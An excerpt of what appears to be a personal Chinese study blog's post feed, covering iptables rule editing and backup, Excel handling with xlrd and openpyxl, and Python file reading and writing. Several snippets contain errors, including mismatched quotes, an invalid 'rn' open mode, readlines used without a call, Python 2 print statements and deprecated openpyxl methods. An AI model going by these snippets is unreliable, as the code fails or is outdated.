<li>-I可以插入到指定位置，没有指定位置的话，默认插入到<strong>规则的首部</strong>。</li>
</ul>
<h2 id="修改规则"><a href="#修改规则" class="headerlink" title="修改规则"></a>修改规则</h2><p>需要使用<code>-R参数</code>来修改规则。</p>
<p>比如把添加在第6行规则的DROP修改为ACCEPT，首先使用su命令切换为root用户，再于终端页面输入如下命令：<code>iptables -R INPUT 6 -s 192.168.2.6 -j ACCEPT</code></p>
<h2 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h2><p>删除规则有两种方法，但都必须使用<code>-D参数</code></p>
<p><code>iptables -D INPUT 6 -s 192.168.2.6 -j ACCEPT</code>：删除添加的第6行的规则</p>
<p>有时需要删除的规则较长，删除时需要写一大串的代码，这样比较容易写错，这时可以先使用-line-number找出该条规则的行号，再通过行号删除规则。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT 6</span><br></pre></td></tr></table></figure>


<h1 id="防火墙的备份与还原"><a href="#防火墙的备份与还原" class="headerlink" title="防火墙的备份与还原"></a>防火墙的备份与还原</h1><p>默认的iptables防火墙规则会立刻生效，但如果不保存，当<strong>计算机重启后所有的规则都会丢失</strong>。</p>
<p>因而，对防火墙规则进行及时保存的操作是非常必要的。</p>
<p>iptables软件包提供了<strong>两个非常有用的工具</strong>，我们可以使用这两个工具处理大量的防火墙规则。</p>
<p>这两个工具分别如下：</p>
<ol>
<li><code>iptables-save</code>  <a href="https://www.w3cschool.cn/linuxc/linuxc-miaz3lgm.html">ddd</a></li>
<li><code>iptables-restore</code><a href="https://www.w3cschool.cn/linuxc/linuxc-r23e3lgl.html">ddd</a></li>
</ol>
<h1 id="几个实例"><a href="#几个实例" class="headerlink" title="几个实例"></a>几个实例</h1><p><a href="https://www.w3cschool.cn/linuxc/linuxc-6ghl3lgn.html">https://www.w3cschool.cn/linuxc/linuxc-6ghl3lgn.html</a>  最下面</p>
<p>万变不离其宗，按照使用规则一步步匹配，对应参数即可。</p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>python应用--excel</title>
    <url>/2023/04/10/python%E5%BA%94%E7%94%A8--excel/</url>
    <content><![CDATA[<blockquote>
<p>本文介绍以下使用python库实现对excel的读写。主要思路就是通过<strong>xlrd</strong>读取excel数据进行处理、通过<strong>openpyxl</strong>进行数据的写入。<br>（python有很多处理excel的库，这里只是记录其中一种方式。后面会系统学习pandas）</p>
<blockquote>
<p>参考：<a href="https://www.jb51.net/article/165629.htm">https://www.jb51.net/article/165629.htm</a><br><a href="https://www.jb51.net/article/205141.htm#_label0">https://www.jb51.net/article/205141.htm#_label0</a></p>
</blockquote>
</blockquote>
<h1 id="xlrd的使用"><a href="#xlrd的使用" class="headerlink" title="xlrd的使用"></a>xlrd的使用</h1><blockquote>
<ol>
<li>安装</li>
</ol>
</blockquote>
<p>在pycharm中的控制台输入：<code>pip install xlrd</code>即可</p>
<blockquote>
<ol start="2">
<li>操作流程</li>
</ol>
</blockquote>
<ol>
<li>导入模块</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd as xr</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打开工作簿</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filename是文件的路径名称</span></span><br><span class="line">workbook = xlrd.open_workbook(filename=<span class="string">r&#x27;C:\Users\Windows10\Desktop\xlsx文件.xlsx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>获取需要操作的sheet表格（有三种方法）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">通过索引获取：--------------</span><br><span class="line"><span class="comment"># 获取第一个sheet表格</span></span><br><span class="line">table = workbook.sheets()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">通过sheet名称获取：---------</span><br><span class="line"><span class="comment"># 通过sheet名称获取</span></span><br><span class="line">table = workbook.sheet_by_name(sheet_name=<span class="string">&#x27;Sheet1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>补充：获取excel所有sheel名称</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取工作薄中所有的sheet名称</span></span><br><span class="line">names = workbook.sheet_names()</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>行列操作</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 获取sheet中有效行数</span></span><br><span class="line">row = table.nrows</span><br><span class="line"><span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取sheet中有效列数</span></span><br><span class="line">col = table.ncols</span><br><span class="line"><span class="built_in">print</span>(col)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该行的有效单元格长度</span></span><br><span class="line">num = table.row_len(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rowx表示是获取第几行的数据</span></span><br><span class="line"><span class="comment"># start_col表示从索引为多少开始，end_colx表示从索引为多少结束，</span></span><br><span class="line"><span class="comment"># end_colx为None表示结束没有限制</span></span><br><span class="line"><span class="comment"># 获取指定行中的数据并以列表的形式返回</span></span><br><span class="line">table_list = table.row_values(rowx=<span class="number">0</span>, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(table_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># colx表示是获取第几列的数据</span></span><br><span class="line"><span class="comment"># start_rowx表示从索引为多少开始，end_rowx表示从索引为多少结束，</span></span><br><span class="line"><span class="comment"># end_rowx为None表示结束没有限制</span></span><br><span class="line"><span class="comment"># 获取指定列中的数据并以列表的形式返回</span></span><br><span class="line">table_list = table.col_values(colx=<span class="number">0</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(table_list)</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.row(<span class="number">0</span>)) </span><br><span class="line"><span class="comment">#返回由该行中所有的单元格对象组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.row_slice(<span class="number">0</span>)) </span><br><span class="line"><span class="comment">#返回由该行中所有单元格的数据类型组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.row_types(<span class="number">0</span>, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.col(<span class="number">0</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)) </span><br><span class="line"><span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.col_slice(<span class="number">0</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)) </span><br><span class="line"><span class="comment">#返回由该列中所有单元格的数据类型组成的列表</span></span><br><span class="line"><span class="built_in">print</span>(table.col_types(<span class="number">0</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>单元格操作</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 获取指定单元格内的值</span></span><br><span class="line">value = table.cell_value(rowx=<span class="number">0</span>, colx=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取单元格内的组成对象和数据</span></span><br><span class="line">value = table.cell(rowx=<span class="number">0</span>, colx=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取单元格的数据类型</span></span><br><span class="line"><span class="comment"># python读取excel中单元格的内容返回的有5种类型。ctype : 0 empty,1 string, 2 number, 3 date, 4 boolean, 5 error。即date的ctype=3，这时需要使用xlrd的xldate_as_tuple来处理为date格式，先判断表格的ctype=3时xldate才能开始操作。</span></span><br><span class="line">value = table.cell_type(rowx=<span class="number">0</span>, colx=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="openpyxl的使用"><a href="#openpyxl的使用" class="headerlink" title="openpyxl的使用"></a>openpyxl的使用</h1><h2 id="特点概述"><a href="#特点概述" class="headerlink" title="特点概述"></a>特点概述</h2><blockquote>
<p>openpyxl（可读写excel表）专门处理Excel2007及以上版本产生的xlsx文件，xls和xlsx之间转换容易 注意：如果文字编码是“gb2312” 读取后就会显示乱码，请先转成Unicode。</p>
</blockquote>
<ol>
<li><p>起始值：1，1</p>
</li>
<li><p>openpyxl 支持直接横纵坐标访问，如A1,B2..</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ws[<span class="string">&#x27;A4&#x27;</span>] = <span class="number">4</span> <span class="comment">#直接赋值</span></span><br></pre></td></tr></table></figure>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><blockquote>
<p>先理清openpyxl的操作对象</p>
</blockquote>
<ul>
<li><code>workbook</code>： 工作簿，一个excel文件包含多个sheet。</li>
<li><code>sheet</code>：工作表，一个workbook有多个，表名识别，如“sheet1”,“sheet2”等。</li>
<li><code>cell</code>： 单元格，存储数据对象</li>
</ul>
<ol>
<li>新建表</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wb = Workbook(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用_active_sheet_index属性, 默认会设置0，也就是第一个worksheet。</span></span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建worksheets，通过 openpyxl.workbook.Workbook.create_sheet() 方法：</span></span><br><span class="line">ws = wb.create_sheet(<span class="string">&quot;Mysheet&quot;</span>) <span class="comment">#插入到最后(default)</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"> ws = wb.create_sheet(<span class="string">&quot;Mysheet&quot;</span>, <span class="number">0</span>) <span class="comment">#插入到最开始的位置</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建的sheet的名称会自动创建，按照sheet，sheet1，sheet2自动增长，通过title属性可以修改其名称</span></span><br><span class="line">ws.title = <span class="string">&quot;New Title&quot;</span></span><br><span class="line">ws = wb.create_sheet(title=<span class="string">&quot;Pip&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注：也可以打开已有的excel文件</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xfile = openpyxl.load_workbook(<span class="string">&#x27;D:\\Tencent Files\\95239002\\聚类求和.xlsx&#x27;</span>)</span><br><span class="line">sheet = xfile.get_sheet_by_name(<span class="string">&quot;总的数据&quot;</span>)</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>单元格赋值</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设定单元格的值，三种方式</span></span><br><span class="line">sheet.cell(row=<span class="number">2</span>,column=<span class="number">5</span>).value=<span class="number">99</span></span><br><span class="line">sheet.cell(row=<span class="number">3</span>,column=<span class="number">5</span>,value=<span class="number">100</span>)</span><br><span class="line">ws[<span class="string">&#x27;A4&#x27;</span>] = <span class="number">4</span> <span class="comment">#write</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>逐行写</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ws.append(iterable)</span><br><span class="line"><span class="comment">#添加一行到当前sheet的最底部（即逐行追加从第一行开始） iterable必须是list,tuple,dict,range,generator类型的。 1,如果是list,将list从头到尾顺序添加。 2，如果是dict,按照相应的键添加相应的键值。</span></span><br><span class="line">ws.append([‘This <span class="keyword">is</span> A1<span class="string">&#x27;, ‘This is B1&#x27;</span>, ‘This <span class="keyword">is</span> C1<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">ws.append(&#123;‘A&#x27;</span> : ‘This <span class="keyword">is</span> A1<span class="string">&#x27;, ‘C&#x27;</span> : ‘This <span class="keyword">is</span> C1<span class="string">&#x27;&#125;)</span></span><br><span class="line"><span class="string">ws.append(&#123;1 : ‘This is A1&#x27;</span>, <span class="number">3</span> : ‘This <span class="keyword">is</span> C1<span class="string">&#x27;&#125;)</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>读表操作</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#打开文件：</span></span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_workbook</span><br><span class="line">excel=load_workbook(<span class="string">&#x27;E:/test.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment">#获取sheet：</span></span><br><span class="line">table = excel.get_sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)  <span class="comment">#通过表名获取 </span></span><br><span class="line"><span class="comment">#获取行数和列数：</span></span><br><span class="line">rows=table.max_row  <span class="comment">#获取行数</span></span><br><span class="line">cols=table.max_column  <span class="comment">#获取列数</span></span><br><span class="line"><span class="comment">#获取单元格值：</span></span><br><span class="line">Data=table.cell(row=row,column=col).value <span class="comment">#获取表格内容，是从第一行第一列是从1开始的，注意不要丢掉 .value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过名字</span></span><br><span class="line">  ws = wb[<span class="string">&quot;frequency&quot;</span>] </span><br><span class="line">  <span class="comment">#等同于 ws2 = wb.get_sheet_by_name(&#x27;frequency&#x27;)</span></span><br><span class="line">  <span class="comment">#不知道名字用index</span></span><br><span class="line">  sheet_names = wb.get_sheet_names()</span><br><span class="line">  ws = wb.get_sheet_by_name(sheet_names[index])<span class="comment"># index为0为第一张表 </span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">  ws =wb.active</span><br><span class="line">  <span class="comment"># 等同于 ws = wb.get_active_sheet() #通过_active_sheet_index设定读取的表，默认0读第一个表</span></span><br><span class="line">  <span class="comment">#活动表表名</span></span><br><span class="line">  wb.get_active_sheet().title</span><br><span class="line">  </span><br><span class="line"><span class="comment">#逐行读</span></span><br><span class="line">    ws.iter_rows(range_string=<span class="literal">None</span>, row_offset=<span class="number">0</span>, column_offset=<span class="number">0</span>): <span class="built_in">range</span>-string(string)-单元格的范围：例如(<span class="string">&#x27;A1:C4&#x27;</span>) row_offset-添加行 column_offset-添加列 </span><br><span class="line">  <span class="comment"># 返回一个生成器, 注意取值时要用value,例如：</span></span><br><span class="line">  <span class="keyword">for</span> row <span class="keyword">in</span> ws.iter_rows(<span class="string">&#x27;A1:C2&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">      <span class="built_in">print</span> cell</span><br><span class="line">  <span class="comment">#读指定行、指定列:</span></span><br><span class="line">  rows=ws.rows<span class="comment">#row是可迭代的 </span></span><br><span class="line">  columns=ws.columns<span class="comment">#column是可迭代的</span></span><br><span class="line">  <span class="comment">#打印第n行数据 </span></span><br><span class="line">  <span class="built_in">print</span> rows[n]<span class="comment">#不需要用.value </span></span><br><span class="line">  <span class="built_in">print</span> columns[n]<span class="comment">#不需要用.value</span></span><br></pre></td></tr></table></figure>

<h1 id="具体例子：聚类求和"><a href="#具体例子：聚类求和" class="headerlink" title="具体例子：聚类求和"></a>具体例子：聚类求和</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd <span class="keyword">as</span> xr</span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line">xlsx = xr.open_workbook(<span class="string">&quot;D:\\Tencent Files\\95239002\\聚类求和.xlsx&quot;</span>)</span><br><span class="line">ret1 = xlsx.sheets()[<span class="number">0</span>]</span><br><span class="line">sheet1_col1 = ret1.col_values(<span class="number">0</span>)</span><br><span class="line">sheet1_col2 = ret1.col_values(<span class="number">1</span>)</span><br><span class="line">sheet1_col3 = [<span class="string">&quot;result&quot;</span>]</span><br><span class="line">i, j = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> j&lt;<span class="built_in">len</span>(sheet1_col2) <span class="keyword">and</span> sheet1_col2[i]==sheet1_col2[j]:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">        sheet1_col3.append(<span class="built_in">round</span>(sheet1_col1[i], <span class="number">6</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sheet1_col3.append(<span class="built_in">round</span>(<span class="built_in">sum</span>(sheet1_col1[i:j]), <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(k-<span class="number">1</span>):</span><br><span class="line">            sheet1_col3.append(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">        k = <span class="number">1</span></span><br><span class="line">    i = j</span><br><span class="line">    j = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> j&gt;=<span class="built_in">len</span>(sheet1_col2):</span><br><span class="line">        sheet1_col3.append(<span class="built_in">round</span>(sheet1_col1[i], <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(sheet1_col3)</span><br><span class="line"></span><br><span class="line">xfile = openpyxl.load_workbook(<span class="string">&#x27;D:\\Tencent Files\\95239002\\聚类求和.xlsx&#x27;</span>)</span><br><span class="line">sheet = xfile.get_sheet_by_name(<span class="string">&quot;总的数据&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sheet1_col3)+<span class="number">1</span>):</span><br><span class="line">    sheet.cell(i, <span class="number">3</span>, sheet1_col3[i-<span class="number">1</span>])</span><br><span class="line">xfile.save(<span class="string">&quot;聚类求和3.xlsx&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习 -- ch6 文件与异常</title>
    <url>/2023/04/10/python%E5%AD%A6%E4%B9%A0%20--%20ch6%20%E6%96%87%E4%BB%B6%E4%B8%8E%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h1 id="读写文本文件"><a href="#读写文本文件" class="headerlink" title="读写文本文件"></a>读写文本文件</h1><blockquote>
<p>思维导图如下</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806109.png"></p>
<p>本节需要<strong>掌握的方法</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806567.png"></p>
<p>常见的<strong>操作模式</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806115.png"></p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><blockquote>
<p>使用open()函数用于文件的读取。</p>
</blockquote>
<p><strong>语法格式</strong>：<code>&lt; 变量名&gt; = open(&lt;文件名&gt;,&lt;打开模式&gt;,&lt;编码方式&gt;)</code></p>
<p><strong>文件处理的步骤</strong>：打开文件 –&gt; 文件操作 —&gt; 关闭文件</p>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;student.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)  <span class="comment"># 打开文件（以读取的方式）</span></span><br><span class="line"><span class="built_in">print</span>(fp.read())          <span class="comment"># 进行文件的查看</span></span><br><span class="line">fp.close()					  <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>

<p><strong>注1</strong>：对于<strong>中文文件</strong>，在读入是需要给出<strong>编码格式</strong><br><code>fp = open(&quot;file&quot;,&quot;r&quot;,encoding = &#39;utf-8)</code></p>
<p><strong>注2</strong>：如果需要给出<strong>文件路径</strong>，有以下几个方法：</p>
<ul>
<li>fp &#x3D; open(‘c:\test\student.txt’,’r’)    — 是绝对路径，使用两个\，前面的\为转义字符。</li>
<li>fp &#x3D; open(‘c:&#x2F;test&#x2F;student.txt’,’r’)      —是绝对路径</li>
<li>fp &#x3D; open(‘.&#x2F;student.txt’,’r’)               —是相对路径（.代表当前文件夹）</li>
</ul>
<p><strong>读取文件的几个方法</strong>：</p>
<ol>
<li>使用fp.read()直接输出全部内容。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;student.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)  <span class="comment"># 打开文件（以读取的方式）</span></span><br><span class="line"><span class="built_in">print</span>(fp.read())          <span class="comment"># 进行文件的查看</span></span><br><span class="line">fp.close()					  <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用for-in 逐行读取文件内容</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;student.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)  <span class="comment"># 打开文件（以读取的方式）</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp:</span><br><span class="line">	<span class="built_in">print</span>(line,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">fp.close()					  <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用readlines按行读取文件内容。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;student.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)  <span class="comment"># 打开文件（以读取的方式）</span></span><br><span class="line">line = fp.readlines()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">fp.close()					  <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>
<p>注：这种方法是把文本封装为一个<strong>列表形式</strong>。（包括换行符)</p>
<p>使用<code>strip()方法</code>把列表结尾的<strong>换行符去掉</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;student.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)  <span class="comment"># 打开文件（以读取的方式）</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines:</span><br><span class="line">	line = line.strip()</span><br><span class="line">	<span class="built_in">print</span>(line,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">fp.close()					  <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>

<h2 id="写入文本文件"><a href="#写入文本文件" class="headerlink" title="写入文本文件"></a>写入文本文件</h2><blockquote>
<p>在使用open函数打开时<strong>指定模式为“w”</strong></p>
</blockquote>
<p>直接看一个例子；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">file = [<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;b.txt&#x27;</span>, <span class="string">&#x27;c.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fp1 = []</span><br><span class="line"><span class="keyword">for</span> fp <span class="keyword">in</span> file:</span><br><span class="line">    fp1.append(<span class="built_in">open</span>(fp,<span class="string">&#x27;w&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">50</span>:</span><br><span class="line">        fp1[<span class="number">0</span>].write(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fp1[<span class="number">2</span>].write(<span class="built_in">str</span>(i))</span><br><span class="line">	<span class="keyword">for</span> fp <span class="keyword">in</span> fp1:</span><br><span class="line">		fp.close()</span><br></pre></td></tr></table></figure>


<p>可以使用<strong>列表</strong>利用<code>append()方法</code>进行文件的读取。使用时利用<strong>下标索引</strong>即可。结束后<strong>注意关闭</strong>。</p>
<p><strong>注意</strong>：<code>write()</code>只可以接收<strong>字符串参数</strong>，要使用<code>str()</code>进行转换。</p>
<h2 id="读写二进制文件"><a href="#读写二进制文件" class="headerlink" title="读写二进制文件"></a>读写二进制文件</h2><blockquote>
<p>使用<code>open()函数</code>时指定模式为<code>’rb&#39;</code>，即<strong>可读+二进制</strong>模式。</p>
</blockquote>
<p><strong>一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_gif</span>(<span class="params">file</span>):</span><br><span class="line">    fp = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    first4 = fp.read(<span class="number">4</span>)</span><br><span class="line">    fp.close()</span><br><span class="line">    <span class="keyword">return</span> first4 == <span class="string">b&#x27;GIF8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(is_gif(<span class="string">&quot;./a.gif&quot;</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上下文管理语句：<code>with</code>(会在执行结束后<strong>自动关闭</strong>，不需要再使用fp.close())</p>
</blockquote>
<p><strong>语法格式</strong>：<code>with open(file,&#39;r&#39;) as fp:</code></p>
<p><strong>一个例子</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_gif</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        first4 = fp.read(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> first4 == <span class="string">b&#x27;GIF8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(is_gif(<span class="string">&quot;./a.gif&quot;</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>bytearray()方法</p>
<blockquote>
<p>将二进制文件保存为字节数组。</p>
</blockquote>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./a.gif&#x27;,&#x27;rn&#x27;) as fp:</span></span><br><span class="line"><span class="string">	byt = bytearray(fp.read())</span></span><br><span class="line"><span class="string">	size = len(byt)</span></span><br><span class="line"><span class="string">	for i in range(0,size):</span></span><br><span class="line"><span class="string">		char = chr(byt[i])</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h2 id="综合实例：字母出现次数"><a href="#综合实例：字母出现次数" class="headerlink" title="综合实例：字母出现次数"></a>综合实例：字母出现次数</h2><ol>
<li>方法1：使用字符串与列表一一对应</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    num = [<span class="number">0</span>]*<span class="number">26</span>   <span class="comment"># 用于保存字母出现次数</span></span><br><span class="line">    str1 = fp.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i.isalpha(): <span class="comment"># 用于判断是否为字母</span></span><br><span class="line">            i = i.lower()</span><br><span class="line">            num[<span class="built_in">ord</span>(i)-<span class="number">97</span>]+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(num）</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>方法2：使用字典</li>
</ol>
<p><strong>改进方法</strong>：字母与次数一一对应，并且降序排序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">str1 = fp.read()</span><br><span class="line">dict1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">if</span> i.isalpha(): <span class="comment"># 用于判断是否为字母</span></span><br><span class="line">        i = i.lower()</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dict1:</span><br><span class="line">            dict1[i]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dict1[i]=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(dict1.items(), reverse=<span class="literal">True</span>, key = <span class="keyword">lambda</span> e:e[<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：使用sorted()进行排序时，可以通过<code>key参数</code>指定比较的对象。字典是使用<strong>key</strong>进行比较，所以要先<strong>转换为元组</strong>再排序。</p>
